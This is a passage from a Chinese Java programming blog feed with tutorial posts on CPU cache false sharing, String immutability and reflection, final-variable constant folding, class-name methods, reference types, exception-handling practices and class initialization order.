中的任意一个。一般地，具有一定相同低bit位地址的内存块将共享同一个Set。 </p><p>下图为一个2-Way的Cache。由图中可以看到 Main Memory 中的 Index 0,2,4 都映射在Way0的不同 CacheLine 中，Index 1,3,5都映射在Way1的不同 CacheLine 中。</p><p><img src="http://img.javastack.cn/18-5-31/71458405.jpg"></p><h4 id="5-MESI-协议"><a href="#5-MESI-协议" class="headerlink" title="5. MESI 协议"></a>5. MESI 协议</h4><p>多核 CPU 都有自己的专有缓存（一般为L1，L2），以及同一个 CPU 插槽之间的核共享的缓存（一般为L3）。不同核心的CPU缓存中难免会加载同样的数据，那么如何保证数据的一致性呢，就是 MESI 协议了。</p><p>在 MESI 协议中，每个 Cache line 有4个状态，可用 2 个 bit 表示，它们分别是：<br>M(Modified)：这行数据有效，数据被修改了，和内存中的数据不一致，数据只存在于本 Cache 中；<br>E(Exclusive)：这行数据有效，数据和内存中的数据一致，数据只存在于本 Cache 中；<br>S(Shared)：这行数据有效，数据和内存中的数据一致，数据存在于很多 Cache 中；<br>I(Invalid)：这行数据无效。</p><p>那么，假设有一个变量i&#x3D;3（应该是包括变量i的缓存块，块大小为缓存行大小）；已经加载到多核（a,b,c）的缓存中，此时该缓存行的状态为S；此时其中的一个核a改变了变量i的值，那么在核a中的当前缓存行的状态将变为M，b,c核中的当前缓存行状态将变为I。如下图：</p><p><img src="http://img.javastack.cn/18-5-31/66429246.jpg"></p><h4 id="6-解决原理"><a href="#6-解决原理" class="headerlink" title="6. 解决原理"></a>6. 解决原理</h4><p>为了避免由于 false sharing 导致 Cache Line 从 L1,L2,L3 到主存之间重复载入，我们可以使用数据填充的方式来避免，即单个数据填充满一个CacheLine。这本质是一种空间换时间的做法。</p><h4 id="7-Java-对于伪共享的传统解决方案"><a href="#7-Java-对于伪共享的传统解决方案" class="headerlink" title="7. Java 对于伪共享的传统解决方案"></a>7. Java 对于伪共享的传统解决方案</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;**** **&#x2F;import java.util.concurrent.atomic.AtomicLong;public final class FalseSharing    implements Runnable&#123;    public final static int NUM_THREADS &#x3D; 4; &#x2F;&#x2F; change    public final static long ITERATIONS &#x3D; 500L * 1000L * 1000L;    private final int arrayIndex;    private static VolatileLong[] longs &#x3D; new VolatileLong[NUM_THREADS];    static    &#123;        for (int i &#x3D; 0; i &lt; longs.length; i++)        &#123;            longs[i] &#x3D; new VolatileLong();        &#125;    &#125;    public FalseSharing(final int arrayIndex)    &#123;        this.arrayIndex &#x3D; arrayIndex;    &#125;    public static void main(final String[] args) throws Exception    &#123;        final long start &#x3D; System.nanoTime();        runTest();        System.out.println(&quot;duration &#x3D; &quot; + (System.nanoTime() - start));    &#125;    private static void runTest() throws InterruptedException    &#123;        Thread[] threads &#x3D; new Thread[NUM_THREADS];        for (int i &#x3D; 0; i &lt; threads.length; i++)        &#123;            threads[i] &#x3D; new Thread(new FalseSharing(i));        &#125;        for (Thread t : threads)        &#123;            t.start();        &#125;        for (Thread t : threads)        &#123;            t.join();        &#125;    &#125;    public void run()    &#123;        long i &#x3D; ITERATIONS + 1;        while (0 !&#x3D; --i)        &#123;            longs[arrayIndex].set(i);        &#125;    &#125;    public static long sumPaddingToPreventOptimisation(final int index)    &#123;        VolatileLong v &#x3D; longs[index];        return v.p1 + v.p2 + v.p3 + v.p4 + v.p5 + v.p6;    &#125;    &#x2F;&#x2F;jdk7以上使用此方法(jdk7的某个版本oracle对伪共享做了优化)    public final static class VolatileLong    &#123;        public volatile long value &#x3D; 0L;        public long p1, p2, p3, p4, p5, p6;    &#125;    &#x2F;&#x2F; jdk7以下使用此方法    public final static class VolatileLong    &#123;        public long p1, p2, p3, p4, p5, p6, p7; &#x2F;&#x2F; cache line padding        public volatile long value &#x3D; 0L;        public long p8, p9, p10, p11, p12, p13, p14; &#x2F;&#x2F; cache line padding    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-Java-8-中的解决方案"><a href="#8-Java-8-中的解决方案" class="headerlink" title="8. Java 8 中的解决方案"></a>8. Java 8 中的解决方案</h4><p>Java 8 中已经提供了官方的解决方案，Java 8 中新增了一个注解：<code>@sun.misc.Contended</code>。加上这个注解的类会自动补齐缓存行，需要注意的是此注解默认是无效的，需要在 jvm 启动时设置 <code>-XX:-RestrictContended</code> 才会生效。</p><pre class="line-numbers language-none"><code class="language-none">@sun.misc.Contendedpublic final static class VolatileLong &#123;    public volatile long value &#x3D; 0L;    &#x2F;&#x2F;public long p1, p2, p3, p4, p5, p6;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><blockquote><p><a href="http://igoro.com/archive/gallery-of-processor-cache-effects/">http://igoro.com/archive/gallery-of-processor-cache-effects/</a><br><a href="http://ifeve.com/false-sharing/">http://ifeve.com/false-sharing/</a><br><a href="http://blog.csdn.net/muxiqingyang/article/details/6615199">http://blog.csdn.net/muxiqingyang/article/details/6615199</a><br><a href="https://yq.aliyun.com/articles/62865">https://yq.aliyun.com/articles/62865</a></p></blockquote><p>@码农们，你们是怎么理解和解决伪共享的？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的 String 真的是不可变吗？</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%20String%20%E7%9C%9F%E7%9A%84%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%20String%20%E7%9C%9F%E7%9A%84%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>我们都知道 Java 中的 String 类的设计是不可变的，来看下 String 类的源码。</p><pre class="line-numbers language-none"><code class="language-none">public final class String    implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123;        &#x2F;** The value is used for character storage. *&#x2F;    private final char value[];        &#x2F;** Cache the hash code for the string *&#x2F;    private int hash; &#x2F;&#x2F; Default to 0        &#x2F;&#x2F; ...    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出 String 类是 final 类型的，String 不能被继承。其值 value 也就是对字符数组的封装，即 char[]，其值被定义成 private final 的，说明不能通过外界修改，即不可变。</p><h3 id="String-真的-“不可变-“-吗？"><a href="#String-真的-“不可变-“-吗？" class="headerlink" title="String 真的 “不可变 “ 吗？"></a>String 真的 “不可变 “ 吗？</h3><p>来看下面这个例子。</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;Python&quot;;System.out.println(str); &#x2F;&#x2F; Pythonstr &#x3D; &quot;Java&quot;;System.out.println(str); &#x2F;&#x2F; Javastr &#x3D; str.substring(1);System.out.println(str); &#x2F;&#x2F; ava<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>你有可能会问：str 不是由 Python 变成 Java 了吗？然后通过 substring 方法变成 ava 了吗？</strong></p><p>这其实是初学者的一个误区，从上面看 String 的结构可以得知字符串是由字符数组构成的，str 只是一个引用而已，第一次引用了 “Python”，后面变成了 “Java”，而 substring 也是用 Arrays.copyOfRange 方法重新复制字符数组构造了一个新的字符串。</p><p><img src="http://img.javastack.cn/18-9-12/688492.jpg"></p><p>所以说，这里的字符串并不是可变，只是变更了字符串引用。</p><p>关于 substring 在 JDK 各个版本的差异可以看这篇文章《<a href="https://mp.weixin.qq.com/s/3KrBept61jDAtheR27gFJA">注意：字符串substring方法在jkd6,7,8中的差异</a>》，也可以去看 substring 的各个版本的源码。</p><h3 id="String-真的真的真的-“不可变-“-吗？"><a href="#String-真的真的真的-“不可变-“-吗？" class="headerlink" title="String 真的真的真的 “不可变 “ 吗？"></a>String 真的真的真的 “不可变 “ 吗？</h3><p>上面的例子肯定是不可变的，下面这个就尴尬了。</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;Hello Python&quot;;System.out.println(str); &#x2F;&#x2F; Hello PythonField field &#x3D; String.class.getDeclaredField(&quot;value&quot;);field.setAccessible(true);char[] value &#x3D; (char[])field.get(str);value[6] &#x3D; &#39;J&#39;;value[7] &#x3D; &#39;a&#39;;value[8] &#x3D; &#39;v&#39;;value[9] &#x3D; &#39;a&#39;;value[10] &#x3D; &#39;!&#39;;value[11] &#x3D; &#39;!&#39;;System.out.println(str); &#x2F;&#x2F; Hello Java!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过反射，我们改变了底层的字符数组的值，实现了字符串的 “不可变” 性，这是一种骚操作，不建议这么使用，违反了 Java 对 String 类的不可变设计原则，会造成一些安全问题。</p><p>是不是又涨姿势了？分享给你的朋友们吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的宏变量，宏替换详解。</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%E5%AE%8F%E5%8F%98%E9%87%8F%EF%BC%8C%E5%AE%8F%E6%9B%BF%E6%8D%A2%E8%AF%A6%E8%A7%A3%E3%80%82/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E7%9A%84%E5%AE%8F%E5%8F%98%E9%87%8F%EF%BC%8C%E5%AE%8F%E6%9B%BF%E6%8D%A2%E8%AF%A6%E8%A7%A3%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>首先来看下面这段程序，和群友分享的大致一样。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    String hw &#x3D; &quot;hello world&quot;;        String hello &#x3D; &quot;hello&quot;;    final String finalWorld2 &#x3D; &quot;hello&quot;;    final String finalWorld3 &#x3D; hello;    final String finalWorld4 &#x3D; &quot;he&quot; + &quot;llo&quot;;        String hw1 &#x3D; hello + &quot; world&quot;;    String hw2 &#x3D; finalWorld2 + &quot; world&quot;;    String hw3 &#x3D; finalWorld3 + &quot; world&quot;;    String hw4 &#x3D; finalWorld4 + &quot; world&quot;;        System.out.println(hw &#x3D;&#x3D; hw1);    System.out.println(hw &#x3D;&#x3D; hw2);    System.out.println(hw &#x3D;&#x3D; hw3);    System.out.println(hw &#x3D;&#x3D; hw4);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">falsetruefalsetrue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同样是字符串”hello”，为什么用final定义的，且个进行&#x3D;&#x3D;操作却是true有一个是false，而没用final的却是false?</p><p><strong>首先来理解下宏变量：</strong></p><p>Java中，一个用final定义的变量，不管它是类型的变量，只要用final定义了并同时指定了初始值，并且这个初始值是在编译时就被确定下来的，那么这个final变量就是一个宏变量。编译器会把程序所有用到该变量的地方直接替换成该变量的值，也就是说编译器能对宏变量进行宏替换。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">final String a &#x3D; &quot;hello&quot;;final String b &#x3D; a;final String c &#x3D; getHello();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>a在编译期间就能确定下来，而b、c不行，所以a是宏变量，b、c不是。</p><p>所以，再回到上面的程序，finalWorld2和finalWorld4是final定义的，也是在编译期间能确定下来的，所以它能被宏替换，编译器就会让finalWorld2和finalWorld4指向字符串池中缓存的字符串””hello world”，所以它们就是同一个对象。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中获取类名的三种方法，你知道几种？</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%90%8D%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E7%A7%8D%EF%BC%9F/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%90%8D%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E7%A7%8D%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="获取类名的方法"><a href="#获取类名的方法" class="headerlink" title="获取类名的方法"></a>获取类名的方法</h4><p>Java 中获取类名的方式主要有以下三种。</p><ul><li><strong>getName()</strong></li></ul><p>返回的是虚拟机里面的class的类名表现形式。</p><ul><li><strong>getCanonicalName()</strong></li></ul><p>返回的是更容易理解的类名表示。</p><ul><li><strong>getSimpleName()</strong></li></ul><p>返回的是类的简称。</p><h4 id="都有什么区别？"><a href="#都有什么区别？" class="headerlink" title="都有什么区别？"></a>都有什么区别？</h4><p>通过一个实例来看下它们主要的区别。</p><pre class="line-numbers language-none"><code class="language-none">public class TestClass &#123;public static void main(String[] args) &#123;&#x2F;&#x2F; 外部普通类System.out.println(&quot;方法名             类名&quot;);System.out.println(&quot;getName            &quot; + TestClass.class.getName());System.out.println(&quot;getCanonicalName   &quot; + TestClass.class.getCanonicalName());System.out.println(&quot;getSimpleName      &quot; + TestClass.class.getSimpleName());System.out.println();&#x2F;&#x2F; 内部类System.out.println(&quot;getName            &quot; + TestInnerClass.class.getName());System.out.println(&quot;getCanonicalName   &quot; + TestInnerClass.class.getCanonicalName());System.out.println(&quot;getSimpleName      &quot; + TestInnerClass.class.getSimpleName());System.out.println();&#x2F;&#x2F; 数组类TestInnerClass[] testInnerClasses &#x3D; new TestInnerClass[]&#123;new TestInnerClass(),new TestInnerClass(),new TestInnerClass()&#125;;System.out.println(&quot;getName            &quot; + testInnerClasses.getClass().getName());System.out.println(&quot;getCanonicalName   &quot; + testInnerClasses.getClass().getCanonicalName());System.out.println(&quot;getSimpleName      &quot; + testInnerClasses.getClass().getSimpleName());System.out.println();&#125;static class TestInnerClass &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出以下结果。</p><pre class="line-numbers language-none"><code class="language-none">方法名              类名getName            com.test.TestClassgetCanonicalName   com.test.TestClassgetSimpleName      TestClassgetName            com.test.TestClass$TestInnerClassgetCanonicalName   com.test.TestClass.TestInnerClassgetSimpleName      TestInnerClassgetName            [Lcom.test.TestClass$TestInnerClass;getCanonicalName   com.test.TestClass.TestInnerClass[]getSimpleName      TestInnerClass[]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>[Lcom.test.TestClass$TestInnerClass;</code>值得说明一下。</p><p>这是一种对函数返回值和参数的编码，叫做JNI字段描述符（JavaNative Interface FieldDescriptors)。</p><p><code>[</code> 表示数组，一个代表一维数组，比如 <code>[[</code> 代表二维数组。之后 <code>L</code> 代表类描述符，最后<code>;</code>表示类名结束。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>1、从以上结果可以看出 getName() 和 getCanonicalName() 在获取普通类名的时候没有区别，在获取内部类和数组类有区别的。</p><p>2、getSimpleName() 在获取普通类和内部类名的时候没区别，在获取数组类的时候有区别。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 对象引用四个级别（强、软、弱、虚）</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E5%9B%9B%E4%B8%AA%E7%BA%A7%E5%88%AB%EF%BC%88%E5%BC%BA%E3%80%81%E8%BD%AF%E3%80%81%E5%BC%B1%E3%80%81%E8%99%9A%EF%BC%89/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E5%9B%9B%E4%B8%AA%E7%BA%A7%E5%88%AB%EF%BC%88%E5%BC%BA%E3%80%81%E8%BD%AF%E3%80%81%E5%BC%B1%E3%80%81%E8%99%9A%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/17-12-27/5366993.jpg" alt="image"></p><p>为了使程序能更加灵活地控制对象的生命周期，从JDK1.2版本开始，JDK把对象的引用级别分为了以下四种。</p><p><strong>这4种级别由高到低依次为：</strong></p><ul><li>强引用（StrongReference）</li></ul><p>强引用就是我们平常最基本的对象引用，如果是强引用，那回收器不会回收带有强引用的对象。即使内存不足抛出OutOfMemoryError异常也不会回收强引用对象，存在即合理吧。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">User user &#x3D; new User(&quot;Java技术&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就是强引用，user持有了这个对象的存储地址的引用。</p><ul><li>软引用（SoftReference）</li></ul><p>一个对象只有软引用，如果内存空间足够情况下垃圾回收器就不会回收它，如果内存空间不够了就会对这些只有软引用的对象进行回收。只要垃圾回收器没有回收，该软引用对象就可以继续被程序使用。</p><p>所以软引用一般用来实现一些内存敏感的缓存，只要内存空间足够，对象就会保持不被回收掉。</p><ul><li>弱引用（WeakReference）</li></ul><p>弱引用的对象具有更短暂的生命周期，在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程，因此不一定会很快发现那些只具有弱引用的对象。</p><p>弱引用可以用来实现一些规范化映射，如WeakHashMap，当key或者value不再被引用时可以自动被回收。</p><ul><li>虚引用（PhantomReference）</li></ul><p>虚引用顾名思义就是形同虚设，虚引用并不决定对象的生命周期，如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收器回收。</p><p>虚引用主要用来跟踪对象被垃圾回收器回收的活动，虚引用必须和引用队列（ReferenceQueue）联合使用，当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。</p><p><strong>下面通过一张表格来说明它们的回收时间、用途。</strong></p><table><thead><tr><th>引用类型</th><th>回收时间</th><th>用途</th></tr></thead><tbody><tr><td>强引用</td><td>永不回收</td><td>普通对象引用</td></tr><tr><td>软引用</td><td>内在不足回收</td><td>缓存对象</td></tr><tr><td>弱引用</td><td>垃圾回收时</td><td>缓存对象</td></tr><tr><td>虚引用</td><td>不确定</td><td>不确定</td></tr></tbody></table><p>不管这些东西平时有没有用到，我们都必须了解这些机制，这对个人的知识面及拓展是非常有帮助的。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 异常处理 10 个最佳实践</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%2010%20%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%2010%20%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>异常处理是Java 开发中的一个重要部分。它是关乎每个应用的一个非功能性需求，是为了处理任何错误状况，比如资源不可访问，非法输入，空输入等等。Java提供了几个异常处理特性，以try，catch 和 finally 关键字的形式内建于语言自身之中。Java 编程语言也允许你创建新的异常，并通过使用 throw 和 throws关键字抛出它们。事实上，在Java编程中，Java的异常处理不单单是知道语法这么简单，它必须遵循标准的JDK库，和几个处理错误和异常的开源代码。这里我们将讨论一些关于异常处理的Java 最佳实践。</p><h4 id="1-为可恢复的错误使用检查型异常，为编程错误使用非检查型错误。"><a href="#1-为可恢复的错误使用检查型异常，为编程错误使用非检查型错误。" class="headerlink" title="1) 为可恢复的错误使用检查型异常，为编程错误使用非检查型错误。"></a>1) 为可恢复的错误使用检查型异常，为编程错误使用非检查型错误。</h4><p>选择检查型还是非检查型异常，对于Java编程人员来说，总是让人感到困惑。检查型异常保证你对错误条件提供异常处理代码，这是一种从语言到强制你编写健壮的代码的一种方式，但同时会引入大量杂乱的代码并导致其不可读。当然，如果你有替代品和恢复策略的话，捕捉异常并做些什么看起来似乎也在理。在Java 编程中选择检查型异常还是运行时异常。</p><h4 id="2-在finally程序块中关闭或者释放资源"><a href="#2-在finally程序块中关闭或者释放资源" class="headerlink" title="2) 在finally程序块中关闭或者释放资源"></a>2) 在finally程序块中关闭或者释放资源</h4><p>这在Java编程中，是一个广为人知的最佳实践，在处理网络和IO类的时候，相当于一个标准。在finally块中关闭资源， 在正常和异常执行的情况下，保证之前和稀缺资源的合理释放，这由finally块保证。从Java7开始，该语言有了一项更有趣的功能：资源管理自动化或者ARM块能实现这一功能。尽管如此，我们仍然要记住在finally块中关闭资源，这是对于释放像FileDescriptors这类，应用在socket和文件编程的情况下的有限资源很重要的。</p><h4 id="3-在堆栈跟踪中包含引起异常的原因"><a href="#3-在堆栈跟踪中包含引起异常的原因" class="headerlink" title="3) 在堆栈跟踪中包含引起异常的原因"></a>3) 在堆栈跟踪中包含引起异常的原因</h4><p>很多时候，当一个由另一个异常导致的异常被抛出的时候，Java库和开放源代码会将一种异常包装成另一种异常。日志记录和打印根异常就变得非常重要。 Java异常类提供了 getCause()方法来检索导致异常的原因，这些(原因)可以对异常的根层次的原因提供更多的信息。该Java实践对在进行调试或排除故障大有帮助。时刻记住，如果你将一个异常包装成另一种异常时，构造一个新异常要传递源异常。</p><h4 id="4-始终提供关于异常的有意义的完整的信息"><a href="#4-始终提供关于异常的有意义的完整的信息" class="headerlink" title="4) 始终提供关于异常的有意义的完整的信息"></a>4) 始终提供关于异常的有意义的完整的信息</h4><p>异常信息是最重要的地方，因为这是程序员首先看到的第一个地方，这里你能找到问题产生的根本原因。这里始终提供精确的真实的信息。</p><h4 id="5-避免过度使用检查型异常"><a href="#5-避免过度使用检查型异常" class="headerlink" title="5) 避免过度使用检查型异常"></a>5) 避免过度使用检查型异常</h4><p>检查型异常在强制执行方面有一定的优势，但同时它也破坏了代码，通过掩盖业务逻辑使代码可读性降低。只要你不过度使用检查型异常，你可以最大限度的减少这类情况，这样做的结果是你会得到更清洁的代码。你同样可以使用Java7的新功能，以移除重复项。</p><h4 id="6-将检查型异常转为运行时异常"><a href="#6-将检查型异常转为运行时异常" class="headerlink" title="6) 将检查型异常转为运行时异常"></a>6) 将检查型异常转为运行时异常</h4><p>这是在像Spring之类的多数框架中用来限制使用检查型异常的技术之一，大部分出自于JDBC的检查型异常，都被包装进 DataAccessException中，而(DataAccessException)异常是一种非检查型异常。这是Java最佳实践带来的好处，特定的异常限制到特定的模块，像 SQLException 放到DAO层，将意思明确的运行时异常抛到客户层。</p><h4 id="7-记住对性能而言，异常代价高昂"><a href="#7-记住对性能而言，异常代价高昂" class="headerlink" title="7) 记住对性能而言，异常代价高昂"></a>7) 记住对性能而言，异常代价高昂</h4><p>需要记住的一件事是异常代价高昂，同时让你的代码运行缓慢。假如你有方法从ResultSet(结果集)中进行读取，这时常会抛出SQLException 异常而不会移到下一元素，这将会比不抛出异常的正常代码执行的慢的多。因此最大限度的减少不必要的异常捕捉和移动，那里没有什么固定的原因。不要仅仅是抛出和捕捉异常，如果你能使用boolean变量去表示执行结果，可能会得到更整洁，更高性能的解决方案。修正错误的根源，避免不必须要的异常捕捉。</p><h4 id="8-避免catch块为空"><a href="#8-避免catch块为空" class="headerlink" title="8) 避免catch块为空"></a>8) 避免catch块为空</h4><p>没有什么比空的catch块更糟糕的了，因为它不仅隐藏了错误和异常，同时可能导致你的对象处于不可使用或者脏的状态。空的catch块只能变得无意义，如果你非常肯定异常不会继续以任何方式影响对象状态，但在程序执行期间，用日志记录错误依然是最好的(方法)。对于在Java编程中编写异常处理代码，这不仅仅是一个Java最佳实践，而是一个最通用的实践。</p><h4 id="9-使用标准异常"><a href="#9-使用标准异常" class="headerlink" title="9) 使用标准异常"></a>9) 使用标准异常</h4><p>我们的第九条最佳实践建议使用标准和内置的Java异常。使用标准异常而不是每次创建我们自己的异常，对于维护性和一致性，不管是现在还是以后，都是最好的选择。重用标准异常使代码更具可读性，因为大部分Java开发人员对标准的像源自于JDK的RuntimeException 异常，IllegalStateException 异常，Illegal Argument Exception 异常或者NullPointerException异常，(开发者)他们能一眼就知道每种异常的目的，而不是在代码里查找或者在文档里查找用户定义的异常的目的。</p><h4 id="10-记录任何方法抛出的异常"><a href="#10-记录任何方法抛出的异常" class="headerlink" title="10) 记录任何方法抛出的异常"></a>10) 记录任何方法抛出的异常</h4><p>Java提供了throw和throws关键字来抛出异常，在javadoc中用@throw记录任何方法可能会抛出的异常。如果你编写API或者公共接口，这就变得非常重要。任何方法抛出的异常都有相应的文档记录，这样你就能下意识的提醒任何使用(该方法)的人。</p><p>这些就是所有在Java编程中在处理异常的时候需要遵循的最佳实践。让我们知道了什么是在Java编程中编写异常处理代码时需要遵循的实践。</p><p>原文：<a href="https://www.oschina.net/translate/10-exception-handling-best-practices-in-java-programming">https://www.oschina.net/translate/10-exception-handling-best-practices-in-java-programming</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 类初始化顺序，3个示例带你躺坑。</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%BA%E5%BA%8F%EF%BC%8C3%E4%B8%AA%E7%A4%BA%E4%BE%8B%E5%B8%A6%E4%BD%A0%E8%BA%BA%E5%9D%91%E3%80%82/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%BA%E5%BA%8F%EF%BC%8C3%E4%B8%AA%E7%A4%BA%E4%BE%8B%E5%B8%A6%E4%BD%A0%E8%BA%BA%E5%9D%91%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>最近发现微信群里面有些群友在讨论类的初始化顺序，如类的静态变量、成员变量、静态代码块、非静态代码块、构造器，及继承父类时，它们的初始化顺序都是怎样的，下面我通过例子来说明这个情况，以免被人误导。</p><h4 id="示例1：测试单类的初始化顺序"><a href="#示例1：测试单类的初始化顺序" class="headerlink" title="示例1：测试单类的初始化顺序"></a>示例1：测试单类的初始化顺序</h4><pre class="line-numbers language-none"><code class="language-none">public class ClassInitOrderTest &#123;public static String staticField &#x3D; &quot;static field&quot;;static &#123;System.out.println(staticField);System.out.println(&quot;static block&quot;);&#125;private String field &#x3D; &quot;member field&quot;;&#123;System.out.println(field);System.out.println(&quot;non-static block&quot;);&#125;public ClassInitOrderTest() &#123;System.out.println(&quot;constructor&quot;);&#125;public static void main(String[] args) &#123;new ClassInitOrderTest();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">static fieldstatic blockmember fieldnon-static blockconstructor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得出以下结论，单类的初始化顺序为：</p><blockquote><p><strong>静态变量 &gt; 静态初始块 &gt; 成员变量 &gt; 非静态初始块 &gt; 构造器</strong></p></blockquote><h4 id="示例2：测试类继承的初始化顺序"><a href="#示例2：测试类继承的初始化顺序" class="headerlink" 